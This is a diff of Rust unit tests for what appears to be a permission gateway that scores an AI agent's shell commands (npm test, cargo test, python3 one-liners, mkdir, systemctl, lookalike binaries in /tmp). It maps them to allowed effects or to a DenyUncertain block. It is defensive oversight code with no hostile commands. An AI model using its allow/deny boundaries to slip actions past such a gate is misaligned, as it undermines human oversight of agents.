+        assert_eq!(resolved("node --version"), ResolvedEffect::ReadOnly);
+        let focused_node_test = assess_invocation(
+            None,
+            "exec_command",
+            &json!({"cmd": "node --test --test-name-pattern='codex invalid key' plugins/executor/tests/browser-onboarding.test.mjs"}),
+            Some("validate"),
+        );
+        assert_eq!(focused_node_test.risk, RiskBand::Moderate);
+        assert_eq!(focused_node_test.exposure, ExposureBand::Local);
+        assert_eq!(
+            focused_node_test.required_capability,
+            Some("BoundedLocalExecution")
+        );
+        let request = focused_node_test.semantic_request.as_ref().unwrap().clone();
+        assert_eq!(
+            pipeline_from_parts(
+                focused_node_test,
+                semantic_receipt(&request, SemanticAssessorStatus::Disabled),
+                true,
+            )
+            .resolve_effect(),
+            ResolvedEffect::BoundedLocalExecution
+        );
+        assert_eq!(
+            resolved("/Users/ben/.cargo/bin/cargo test --offline -p statewright-mcp-gateway"),
+            ResolvedEffect::BoundedLocalExecution
+        );
+        assert_eq!(resolved("npm test"), ResolvedEffect::BoundedLocalExecution);
+        assert_eq!(
+            resolved("pnpm run test"),
+            ResolvedEffect::BoundedLocalExecution
+        );
+        assert_eq!(
+            resolved("if npm test; then git status --short; fi"),
+            ResolvedEffect::BoundedLocalExecution
+        );
+        assert_eq!(
+            resolved("cargo test --offline -p statewright-mcp-gateway"),
+            ResolvedEffect::BoundedLocalExecution
+        );
+        assert_eq!(
+            resolved("cargo test -p statewright-mcp-gateway"),
+            ResolvedEffect::DenyUncertain
+        );
+        assert_eq!(
+            resolved("node --test ../outside.test.mjs"),
+            ResolvedEffect::DenyUncertain
+        );
+
+        set_test_shell_ast_shadow_enabled(None);
+        set_test_shell_ast_authority_enabled(None);
+    }
+
+    #[test]
+    fn intent_fingerprint_is_stable_for_equivalent_redacted_shapes() {
+        let visible = |command: &str| {
+            let deterministic = assess_invocation(
+                None,
+                "exec_command",
+                &json!({"cmd": command}),
+                Some("validate"),
+            );
+            let request = deterministic.semantic_request.as_ref().unwrap().clone();
+            pipeline_from_parts(
+                deterministic,
+                semantic_receipt(&request, SemanticAssessorStatus::Disabled),
+                true,
+            )
+            .visible_json()
+        };
+
+        let left = visible("cargo test --offline -p private-package-one");
+        let left_again = visible("cargo test --offline -p private-package-one");
+        let right = visible("cargo test --offline -p private-package-two");
+        assert_eq!(left["intent_fingerprint"], right["intent_fingerprint"]);
+        assert_eq!(
+            left["invocation_fingerprint"],
+            left_again["invocation_fingerprint"]
+        );
+        assert_ne!(
+            left["invocation_fingerprint"],
+            right["invocation_fingerprint"]
+        );
+        assert!(!left.to_string().contains("private-package"));
+    }
+
+    #[test]
+    fn parsed_delegated_units_reach_system_one_without_erasing_known_write_floor() {
+        set_test_shell_ast_shadow_enabled(Some(false));
+        set_test_shell_ast_authority_enabled(Some(true));
+
+        let vector = |read_only, may_write| SemanticRiskVector {
+            read_only: Probability::new(read_only).unwrap(),
+            may_write: Probability::new(may_write).unwrap(),
+            reversible: Probability::new(0.95).unwrap(),
+            destructive: Probability::new(0.01).unwrap(),
+            irreversible: Probability::new(0.01).unwrap(),
+            external_or_account_effect: Probability::new(0.01).unwrap(),
+        };
+        let pipeline = |command: &str, semantic_vector| {
+            let deterministic = assess_invocation(
+                None,
+                "exec_command",
+                &json!({"cmd": command}),
+                Some("implement"),
+            );
+            assert_eq!(deterministic.source, "shell_ast");
+            if command.starts_with("mkdir ") {
+                assert_eq!(deterministic.required_capability, Some("Write"));
+            }
+            let semantic = SemanticAssessmentReceipt {
+                tool: "exec_command".into(),
+                status: SemanticAssessorStatus::Assessed,
+                vector: Some(semantic_vector),
+                state_intent: Some("implement".into()),
+            };
+            pipeline_from_parts(deterministic, semantic, true)
+        };
+
+        assert_eq!(
+            pipeline(
+                "python3 -c 'open(\"x\", \"w\").write(\"y\")'",
+                vector(0.02, 0.97)
+            )
+            .resolve_effect(),
+            ResolvedEffect::LocalWrite
+        );
+        assert_eq!(
+            pipeline("python3 -c 'print(1)'", vector(0.97, 0.02)).resolve_effect(),
+            ResolvedEffect::ReadOnly
+        );
+        assert_eq!(
+            pipeline(
+                "python3 -c 'private_framework.execute()'",
+                vector(0.02, 0.97)
+            )
+            .resolve_effect(),
+            ResolvedEffect::DenyUncertain
+        );
+        assert_eq!(
+            pipeline(
+                "mkdir -p output && python3 -c 'print(1)'",
+                vector(0.97, 0.02),
+            )
+            .resolve_effect(),
+            ResolvedEffect::DenyUncertain
+        );
+        assert_eq!(
+            pipeline(
+                "mkdir -p output && python3 -c 'print(1)'",
+                vector(0.02, 0.97),
+            )
+            .resolve_effect(),
+            ResolvedEffect::LocalWrite
+        );
+        assert_eq!(
+            pipeline(
+                "statewright-git-closeout --message test -- docs/receipt.md && python3 -c 'open(\"x\", \"w\").write(\"y\")'",
+                vector(0.02, 0.97),
+            )
+            .resolve_effect(),
+            ResolvedEffect::LocalWriteAndGitLocalWrite
+        );
+
+        set_test_shell_ast_shadow_enabled(None);
+        set_test_shell_ast_authority_enabled(None);
+    }
+
+    #[test]
+    fn invocation_ast_can_override_a_generic_shell_executor_non_read_hint() {
+        set_test_shell_ast_shadow_enabled(Some(false));
+        set_test_shell_ast_authority_enabled(Some(true));
+
+        let executor: ToolInfo = serde_json::from_value(json!({
+            "name": "exec_command",
+            "inputSchema": {},
+            "annotations": { "readOnlyHint": false }
+        }))
+        .unwrap();
+        let semantic = |read_only, may_write| SemanticAssessmentReceipt {
+            tool: "exec_command".into(),
+            status: SemanticAssessorStatus::Assessed,
+            vector: Some(SemanticRiskVector {
+                read_only: Probability::new(read_only).unwrap(),
+                may_write: Probability::new(may_write).unwrap(),
+                reversible: Probability::new(0.95).unwrap(),
+                destructive: Probability::new(0.01).unwrap(),
+                irreversible: Probability::new(0.01).unwrap(),
+                external_or_account_effect: Probability::new(0.01).unwrap(),
+            }),
+            state_intent: Some("implement".into()),
+        };
+        let pipeline = |command: &str, receipt| {
+            pipeline_from_parts(
+                assess_invocation(
+                    Some(&executor),
+                    "exec_command",
+                    &json!({"cmd": command}),
+                    Some("implement"),
+                ),
+                receipt,
+                true,
+            )
+        };
+
+        let bounded_output = pipeline("python3 -c 'print(1)'", semantic(0.18, 0.82));
+        assert_eq!(
+            bounded_output.deterministic.risk,
+            RiskBand::Low,
+            "{:?}",
+            bounded_output.deterministic
+        );
+        assert_eq!(bounded_output.deterministic.exposure, ExposureBand::Local);
+        assert_eq!(bounded_output.resolve_effect(), ResolvedEffect::ReadOnly);
+        assert_eq!(
+            pipeline(
+                "python3 -c 'open(\"x\", \"w\").write(\"y\")'",
+                semantic(0.02, 0.97)
+            )
+            .resolve_effect(),
+            ResolvedEffect::LocalWrite
+        );
+        assert_eq!(
+            pipeline(
+                "python3 -c 'private_framework.execute()'",
+                semantic(0.97, 0.02)
+            )
+            .resolve_effect(),
+            ResolvedEffect::DenyUncertain
+        );
+        assert_eq!(
+            pipeline("systemctl status statewright", semantic(0.97, 0.02)).resolve_effect(),
+            ResolvedEffect::DenyUncertain
+        );
+        for command in [
+            "python3 -c 'print(1); private_framework.execute()'",
+            "python3 -c 'print(1)' && systemctl status statewright",
+        ] {
+            let unresolved = pipeline(command, semantic(0.97, 0.02));
+            assert_eq!(
+                unresolved.deterministic.risk,
+                RiskBand::Moderate,
+                "{command}"
+            );
+            assert_eq!(
+                unresolved.deterministic.exposure,
+                ExposureBand::Unknown,
+                "{command}"
+            );
+            assert_eq!(unresolved.resolve_effect(), ResolvedEffect::DenyUncertain);
+        }
+        for lookalike in ["/tmp/nl -ba README.md", "/tmp/sed -n '1,10p' README.md"] {
+            let deterministic = assess_invocation(
+                None,
+                "exec_command",
+                &json!({"cmd": lookalike}),
+                Some("validate"),
+            );
+            assert_eq!(deterministic.risk, RiskBand::Moderate, "{lookalike}");
+            assert_eq!(deterministic.exposure, ExposureBand::Unknown, "{lookalike}");
+        }
+
         set_test_shell_ast_shadow_enabled(None);
         set_test_shell_ast_authority_enabled(None);
     }
